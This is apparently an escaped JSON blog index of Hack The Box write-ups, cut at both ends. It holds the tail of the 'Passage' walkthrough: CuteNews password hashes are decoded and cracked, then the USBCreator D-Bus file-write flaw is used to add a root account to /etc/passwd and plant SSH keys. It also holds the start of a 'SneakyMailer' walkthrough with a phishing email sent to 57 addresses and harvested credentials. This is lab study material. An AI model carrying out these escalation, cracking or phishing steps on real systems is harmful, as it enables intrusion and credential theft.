\u0026#34;YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319\u0026#34; | base64 -d a:1:{s:5:\u0026#34;email\u0026#34;;a:1:{s:16:\u0026#34;paul@passage.htb\u0026#34;;s:10:\u0026#34;paul-coles\u0026#34;;}} Looks like it\u0026rsquo;s user information Let\u0026rsquo;s decode all files www-data@passage:/var/www/html/CuteNews/cdata/users$ for file in `ls *.php`; do (cat $file | grep -v \u0026#39;php\u0026#39; | base64 -d | grep pass); done a:1:{s:5:\u0026#34;email\u0026#34;;a:1:{s:16:\u0026#34;paul@passage.htb\u0026#34;;s:10:\u0026#34;paul-coles\u0026#34;;}} a:1:{s:4:\u0026#34;name\u0026#34;;a:1:{s:5:\u0026#34;admin\u0026#34;;a:8:{s:2:\u0026#34;id\u0026#34;;s:10:\u0026#34;1592483047\u0026#34;;s:4:\u0026#34;name\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:3:\u0026#34;acl\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:5:\u0026#34;email\u0026#34;;s:17:\u0026#34;nadav@passage.htb\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:64:\u0026#34;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1\u0026#34;;s:3:\u0026#34;lts\u0026#34;;s:10:\u0026#34;1592487988\u0026#34;;s:3:\u0026#34;ban\u0026#34;;s:1:\u0026#34;0\u0026#34;;s:3:\u0026#34;cnt\u0026#34;;s:1:\u0026#34;2\u0026#34;;}}} a:1:{s:4:\u0026#34;name\u0026#34;;a:1:{s:7:\u0026#34;pentest\u0026#34;;a:9:{s:2:\u0026#34;id\u0026#34;;s:10:\u0026#34;1698853880\u0026#34;;s:4:\u0026#34;name\u0026#34;;s:7:\u0026#34;pentest\u0026#34;;s:3:\u0026#34;acl\u0026#34;;s:1:\u0026#34;4\u0026#34;;s:5:\u0026#34;email\u0026#34;;s:16:\u0026#34;pentest@mail.htb\u0026#34;;s:4:\u0026#34;nick\u0026#34;;s:7:\u0026#34;pentest\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:64:\u0026#34;01ba02d06a6a2c7997f53541352c08af02b64272267df3ce1b7c175816041c25\u0026#34;;s:4:\u0026#34;more\u0026#34;;s:60:\u0026#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==\u0026#34;;s:6:\u0026#34;avatar\u0026#34;;s:25:\u0026#34;avatar_pentest_avatar.php\u0026#34;;s:6:\u0026#34;e-hide\u0026#34;;s:0:\u0026#34;\u0026#34;;}}} a:1:{s:5:\u0026#34;email\u0026#34;;a:1:{s:17:\u0026#34;nadav@passage.htb\u0026#34;;s:5:\u0026#34;admin\u0026#34;;}} a:1:{s:4:\u0026#34;name\u0026#34;;a:1:{s:9:\u0026#34;sid-meier\u0026#34;;a:9:{s:2:\u0026#34;id\u0026#34;;s:10:\u0026#34;1592483281\u0026#34;;s:4:\u0026#34;name\u0026#34;;s:9:\u0026#34;sid-meier\u0026#34;;s:3:\u0026#34;acl\u0026#34;;s:1:\u0026#34;3\u0026#34;;s:5:\u0026#34;email\u0026#34;;s:15:\u0026#34;sid@example.com\u0026#34;;s:4:\u0026#34;nick\u0026#34;;s:9:\u0026#34;Sid Meier\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:64:\u0026#34;4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88\u0026#34;;s:3:\u0026#34;lts\u0026#34;;s:10:\u0026#34;1592485645\u0026#34;;s:3:\u0026#34;ban\u0026#34;;s:1:\u0026#34;0\u0026#34;;s:3:\u0026#34;cnt\u0026#34;;s:1:\u0026#34;2\u0026#34;;}}} a:1:{s:4:\u0026#34;name\u0026#34;;a:1:{s:10:\u0026#34;paul-coles\u0026#34;;a:9:{s:2:\u0026#34;id\u0026#34;;s:10:\u0026#34;1592483236\u0026#34;;s:4:\u0026#34;name\u0026#34;;s:10:\u0026#34;paul-coles\u0026#34;;s:3:\u0026#34;acl\u0026#34;;s:1:\u0026#34;2\u0026#34;;s:5:\u0026#34;email\u0026#34;;s:16:\u0026#34;paul@passage.htb\u0026#34;;s:4:\u0026#34;nick\u0026#34;;s:10:\u0026#34;Paul Coles\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:64:\u0026#34;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd\u0026#34;;s:3:\u0026#34;lts\u0026#34;;s:10:\u0026#34;1592485556\u0026#34;;s:3:\u0026#34;ban\u0026#34;;s:1:\u0026#34;0\u0026#34;;s:3:\u0026#34;cnt\u0026#34;;s:1:\u0026#34;2\u0026#34;;}}} a:1:{s:4:\u0026#34;name\u0026#34;;a:1:{s:9:\u0026#34;kim-swift\u0026#34;;a:9:{s:2:\u0026#34;id\u0026#34;;s:10:\u0026#34;1592483309\u0026#34;;s:4:\u0026#34;name\u0026#34;;s:9:\u0026#34;kim-swift\u0026#34;;s:3:\u0026#34;acl\u0026#34;;s:1:\u0026#34;3\u0026#34;;s:5:\u0026#34;email\u0026#34;;s:15:\u0026#34;kim@example.com\u0026#34;;s:4:\u0026#34;nick\u0026#34;;s:9:\u0026#34;Kim Swift\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:64:\u0026#34;f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca\u0026#34;;s:3:\u0026#34;lts\u0026#34;;s:10:\u0026#34;1592487096\u0026#34;;s:3:\u0026#34;ban\u0026#34;;s:1:\u0026#34;0\u0026#34;;s:3:\u0026#34;cnt\u0026#34;;s:1:\u0026#34;3\u0026#34;;}}} a:1:{s:4:\u0026#34;name\u0026#34;;a:2:{s:6:\u0026#34;egre55\u0026#34;;a:11:{s:2:\u0026#34;id\u0026#34;;s:10:\u0026#34;1598829833\u0026#34;;s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;egre55\u0026#34;;s:3:\u0026#34;acl\u0026#34;;s:1:\u0026#34;4\u0026#34;;s:5:\u0026#34;email\u0026#34;;s:15:\u0026#34;egre55@test.com\u0026#34;;s:4:\u0026#34;nick\u0026#34;;s:6:\u0026#34;egre55\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:64:\u0026#34;4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc\u0026#34;;s:4:\u0026#34;more\u0026#34;;s:60:\u0026#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==\u0026#34;;s:3:\u0026#34;lts\u0026#34;;s:10:\u0026#34;1598906881\u0026#34;;s:3:\u0026#34;ban\u0026#34;;s:1:\u0026#34;0\u0026#34;;s:6:\u0026#34;avatar\u0026#34;;s:26:\u0026#34;avatar_egre55_ykxnacpt.php\u0026#34;;s:6:\u0026#34;e-hide\u0026#34;;s:0:\u0026#34;\u0026#34;;}s:6:\u0026#34;hacker\u0026#34;;a:11:{s:2:\u0026#34;id\u0026#34;;s:10:\u0026#34;1598910896\u0026#34;;s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;hacker\u0026#34;;s:3:\u0026#34;acl\u0026#34;;s:1:\u0026#34;4\u0026#34;;s:5:\u0026#34;email\u0026#34;;s:20:\u0026#34;hacker@hacker.hacker\u0026#34;;s:4:\u0026#34;nick\u0026#34;;s:6:\u0026#34;hacker\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:64:\u0026#34;e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9\u0026#34;;s:3:\u0026#34;lts\u0026#34;;s:10:\u0026#34;1598910911\u0026#34;;s:3:\u0026#34;ban\u0026#34;;s:1:\u0026#34;0\u0026#34;;s:4:\u0026#34;more\u0026#34;;s:60:\u0026#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==\u0026#34;;s:6:\u0026#34;avatar\u0026#34;;s:26:\u0026#34;avatar_hacker_jpyoyskt.php\u0026#34;;s:6:\u0026#34;e-hide\u0026#34;;s:0:\u0026#34;\u0026#34;;}}} Now we have nadav:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e sid-meier:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 paul-coles:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd kim-swift:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc hacker:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9 I\u0026rsquo;ll start hashcat └─$ hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt --user hashcat (v6.2.6) starting \u0026lt;SNIP\u0026gt; e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1 Approaching final keyspace - workload adjusted. \u0026lt;SNIP\u0026gt; paul-coles: atlanta1 hacker: hacker Let\u0026rsquo;s try to su www-data@passage:/var/www/html/CuteNews/cdata/users$ su - paul Password: paul@passage:~$ User #2 .ssh contained both private and public keys paul@passage:~$ ls -lha .ssh/ total 24K drwxr-xr-x 2 paul paul 4.0K Jul 21 2020 . drwxr-x--- 16 paul paul 4.0K Sep 2 2020 .. -rw-r--r-- 1 paul paul 395 Jul 21 2020 authorized_keys -rw------- 1 paul paul 1.7K Jul 21 2020 id_rsa -rw-r--r-- 1 paul paul 395 Jul 21 2020 id_rsa.pub -rw-r--r-- 1 paul paul 1.3K Jul 21 2020 known_hosts If we check public key, it shows nadav paul@passage:~/.ssh$ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage Using the private key to ssh as nadav works paul@passage:~/.ssh$ ssh nadav@localhost -i id_rsa Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1 nadav@passage:~$ Root groups No password, so can\u0026rsquo;t sudo -l nadav@passage:~$ id uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) nadav@passage:~$ nadav has .viminfo file If you exit Vim and later start it again, you would normally lose a lot of information. The viminfo file can be used to remember that information, which enables you to continue where you left off. https://vimhelp.org/starting.txt.html#viminfo nadav@passage:~$ cat .viminfo # This viminfo file was generated by Vim 7.4. \u0026lt;SNIP\u0026gt; # File marks: \u0026#39;0 12 7 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \u0026#39;1 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf # Jumplist (newest first): -\u0026#39; 12 7 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf -\u0026#39; 1 0 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf -\u0026#39; 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -\u0026#39; 1 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -\u0026#39; 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -\u0026#39; 1 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf # History of marks within files (newest to oldest): \u0026gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \u0026#34; 12 7 \u0026gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf \u0026#34; 2 0 . 2 0 + 2 0 Both files owned by root nadav@passage:~$ ls -l /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf -rw-r--r-- 1 root root 766 Apr 29 2015 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf -rw-r--r-- 1 root root 65 Jan 15 2019 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf 51-ubuntu-admin.conf is Polkit config file The configuration specifies that sudo and admin groups can invoke privileged processes with a password https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf [Configuration] AdminIdentities=unix-group:sudo;unix-group:admin com.ubuntu.USBCreator.conf nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \u0026lt;!DOCTYPE busconfig PUBLIC \u0026#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\u0026#34; \u0026#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026#34;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;!-- Only root can own the service --\u0026gt; \u0026lt;policy user=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;allow own=\u0026#34;com.ubuntu.USBCreator\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;!-- Allow anyone to invoke methods (further constrained by PolicyKit privileges --\u0026gt; \u0026lt;policy context=\u0026#34;default\u0026#34;\u0026gt; \u0026lt;allow send_destination=\u0026#34;com.ubuntu.USBCreator\u0026#34; send_interface=\u0026#34;com.ubuntu.USBCreator\u0026#34;/\u0026gt; \u0026lt;allow send_destination=\u0026#34;com.ubuntu.USBCreator\u0026#34; send_interface=\u0026#34;org.freedesktop.DBus.Introspectable\u0026#34;/\u0026gt; \u0026lt;allow send_destination=\u0026#34;com.ubuntu.USBCreator\u0026#34; send_interface=\u0026#34;org.freedesktop.DBus.Properties\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;/busconfig\u0026gt; There is a blog It exploits D-Bus Summary A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. We can copy a root flag We have to copy a file to a file that doesn\u0026rsquo;t exist nadav@passage:/dev/shm$ ls -lha total 168K drwxrwxrwt 2 root root 160 Nov 1 10:21 . drwxr-xr-x 18 root root 3.8K Oct 31 11:24 .. -rwx\u0026mdash;\u0026mdash; 1 nadav nadav 65M Oct 31 11:24 pulse-shm-1636705118 -rwx\u0026mdash;\u0026mdash; 1 nadav nadav 65M Oct 31 11:24 pulse-shm-3691360381 -rwx\u0026mdash;\u0026mdash; 1 nadav nadav 65M Oct 31 11:24 pulse-shm-3862711046 -rwx\u0026mdash;\u0026mdash; 1 nadav nadav 65M Oct 31 11:24 pulse-shm-3905698949 -rwx\u0026mdash;\u0026mdash; 1 nadav nadav 65M Oct 31 11:24 pulse-shm-664920523\nnadav@passage:/dev/shm$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /dev/shm/flag.txt true () nadav@passage:/dev/shm$ ls -lha total 168K drwxrwxrwt 2 root root 160 Nov 1 10:21 . drwxr-xr-x 18 root root 3.8K Oct 31 11:24 .. -rw-r--r-- 1 root root 33 Nov 1 10:21 flag.txt -rwx------ 1 nadav nadav 65M Oct 31 11:24 pulse-shm-1636705118 -rwx------ 1 nadav nadav 65M Oct 31 11:24 pulse-shm-3691360381 -rwx------ 1 nadav nadav 65M Oct 31 11:24 pulse-shm-3862711046 -rwx------ 1 nadav nadav 65M Oct 31 11:24 pulse-shm-3905698949 -rwx------ 1 nadav nadav 65M Oct 31 11:24 pulse-shm-664920523 To get a shell we can overwrite /etc/passwd, add our public key to authorized_keys and so on nadav@passage:/dev/shm$ cp /etc/passwd passwd nadav@passage:/dev/shm$ openssl passwd -1 pentest $1$ApmuYR5C$85SftWXmqXbDoZLqhrmD71 nadav@passage:/dev/shm$ echo \u0026#39;pentest:$1$ApmuYR5C$85SftWXmqXbDoZLqhrmD71:0:0:pentest:/root:/bin/bash\u0026#39; \u0026gt;\u0026gt; passwd nadav@passage:/dev/shm$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/passwd /etc/passwd true () nadav@passage:/dev/shm$ tail -2 /etc/passwd sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin pentest:$1$ApmuYR5C$85SftWXmqXbDoZLqhrmD71:0:0:pentest:/root:/bin/bash nadav@passage:/dev/shm$ su - pentest Password: root@passage:~# nadav@passage:/dev/shm$ echo \u0026#34;ssh-rsa AAAAB3\u0026lt;SNIP\u0026gt; kali@kali\u0026#34; \u0026gt; authorized_keys nadav@passage:/dev/shm$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/authorized_keys /root/.ssh/authorized_keys true () └─$ ssh root@10.10.10.206 Warning: Permanently added \u0026#39;10.10.10.206\u0026#39; (ED25519) to the list of known hosts. Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1 root@passage:~# ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/passage/images/passage.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/passage/","summary":"Passage Enumeration nmap └─$ nmap -Pn -p- 10.10.10.206 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 19:01 GMT Nmap scan report for 10.10.10.206 (10.10.10.206) Host is up (0.17s latency). Not shown: 65468 filtered tcp ports (no-response), 65 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.","tags":["HTB","cutenews","webshell","upload","searchsploit","source-code","base64","hashcat","vim","usbcreator","arbitrary-write","arbitrary-read","passwd"],"title":"[HTB] Machine: Passage"},{"categories":null,"contents":"Ready Enumeration nmap ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/ready/images/ready.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/ready/","summary":"Ready Enumeration nmap ","tags":["HTB"],"title":"[HTB] Machine: Ready"},{"categories":null,"contents":"SneakyMailer Enumeration nmap └─$ nmap -Pn -p- 10.10.10.197 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 17:04 GMT Warning: 10.10.10.197 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.197 (10.10.10.197) Host is up (0.17s latency). Not shown: 43759 filtered tcp ports (no-response), 21769 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 25/tcp open smtp 80/tcp open http 143/tcp open imap 993/tcp open imaps 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 119.98 seconds └─$ nmap -Pn -p21,22,25,80,143,993,8080 -sC -sV 10.10.10.197 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 17:07 GMT Nmap scan report for 10.10.10.197 (10.10.10.197) Host is up (0.28s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA) | 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA) |_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING 80/tcp open http nginx 1.14.2 |_http-title: Did not follow redirect to http://sneakycorp.htb |_http-server-header: nginx/1.14.2 143/tcp open imap Courier Imapd (released 2018) |_imap-capabilities: QUOTA CAPABILITY completed UIDPLUS UTF8=ACCEPTA0001 ENABLE SORT IMAP4rev1 THREAD=ORDEREDSUBJECT STARTTLS CHILDREN THREAD=REFERENCES ACL2=UNION IDLE NAMESPACE OK ACL | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Not valid before: 2020-05-14T17:14:21 |_Not valid after: 2021-05-14T17:14:21 |_ssl-date: TLS randomness does not represent time 993/tcp open ssl/imap Courier Imapd (released 2018) |_imap-capabilities: QUOTA CAPABILITY completed UIDPLUS UTF8=ACCEPTA0001 ENABLE AUTH=PLAIN SORT IMAP4rev1 THREAD=ORDEREDSUBJECT CHILDREN THREAD=REFERENCES ACL2=UNION IDLE NAMESPACE OK ACL | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Not valid before: 2020-05-14T17:14:21 |_Not valid after: 2021-05-14T17:14:21 |_ssl-date: TLS randomness does not represent time 8080/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome to nginx! |_http-open-proxy: Proxy might be redirecting requests Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 58.51 seconds Web server Port 8080 gobuster └─$ gobuster dir -u http://sneakycorp.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://sneakycorp.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 185] [--\u0026gt; http://sneakycorp.htb/img/] /css (Status: 301) [Size: 185] [--\u0026gt; http://sneakycorp.htb/css/] /js (Status: 301) [Size: 185] [--\u0026gt; http://sneakycorp.htb/js/] /vendor (Status: 301) [Size: 185] [--\u0026gt; http://sneakycorp.htb/vendor/] /pypi (Status: 301) [Size: 185] [--\u0026gt; http://sneakycorp.htb/pypi/] └─$ gobuster dir -u http://sneakycorp.htb:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://sneakycorp.htb:8080/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 612] vhosts └─$ wfuzz -u http://sneakycorp.htb/ -H \u0026#39;Host: FUZZ.sneakycorp.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 12 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://sneakycorp.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000019: 200 340 L 989 W 13737 Ch \u0026#34;dev\u0026#34; ftp └─$ ftp anonymous@sneakycorp.htb Connected to sneakycorp.htb. 220 (vsFTPd 3.0.3) 530 Permission denied. ftp: Login failed Foothold http://sneakycorp.htb/team.php has a list of users, emails Let\u0026rsquo;s extract them └─$ curl -s http://sneakycorp.htb/team.php | grep \u0026#39;@\u0026#39; | cut -d\u0026#39;\u0026gt;\u0026#39; -f2 | cut -d\u0026#39;\u0026lt;\u0026#39; -f1 \u0026gt; sneakycorp.emails └─$ wc -l sneakycorp.emails 57 sneakycorp.emails dev.sneakycorp.htb has register page, but it doesn\u0026rsquo;t work Since we have a list of emails, let\u0026rsquo;s try phishing them └─$ swaks --to $(cat sneakycorp.emails | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | less) --from it-support@sneakymailer.htb --header \u0026#34;Subject: IT-Support Survey\u0026#34; --body \u0026#34;Hello. It\u0026#39;s SneakyCorp IT-Support team. Please fill in the survey here http://10.10.16.4/\u0026#34; --server 10.10.10.197 === Trying 10.10.10.197:25... === Connected to 10.10.10.197. \u0026lt;- 220 debian ESMTP Postfix (Debian/GNU) -\u0026gt; EHLO kali \u0026lt;- 250-debian \u0026lt;- 250-PIPELINING \u0026lt;- 250-SIZE 10240000 \u0026lt;- 250-VRFY \u0026lt;- 250-ETRN \u0026lt;- 250-STARTTLS \u0026lt;- 250-ENHANCEDSTATUSCODES \u0026lt;- 250-8BITMIME \u0026lt;- 250-DSN \u0026lt;- 250-SMTPUTF8 \u0026lt;- 250 CHUNKING -\u0026gt; MAIL FROM:\u0026lt;it-support@sneakymailer.htb\u0026gt; \u0026lt;SNIP\u0026gt; -\u0026gt; To: tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb, -\u0026gt; From: it-support@sneakymailer.htb -\u0026gt; Subject: IT-Support Survey -\u0026gt; Message-Id: \u0026lt;20231031165747.084219@kali\u0026gt; -\u0026gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/ -\u0026gt; -\u0026gt; Hello. It\u0026#39;s SneakyCorp IT-Support team. Please fill in the survey here http://10.10.16.4/ -\u0026gt; -\u0026gt; -\u0026gt; . \u0026lt;- 250 2.0.0 Ok: queued as 067C524665 -\u0026gt; QUIT \u0026lt;- 221 2.0.0 Bye === Connection closed with remote host. └─$ nc -lvnp 80 listening on [any] 80 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.197] 42234 POST / HTTP/1.1 Host: 10.10.16.4 User-Agent: python-requests/2.23.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Length: 185 Content-Type: application/x-www-form-urlencoded firstName=Paul\u0026amp;lastName=Byrd\u0026amp;email=paulbyrd%40sneakymailer.htb\u0026amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\u0026amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt We receive creds paulbyrd@sneakymailer.htb:^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u0026lt;:Ht We can use imap manually or open mailbox via evolution We find a new set of creds developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C I tried ssh but no success But we can connect via ftp └─$ ftp developer@10.10.10.197 Connected to 10.10.10.197. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; There\u0026rsquo;s a dev directory ftp\u0026gt; ls 229 Entering Extended Passive Mode 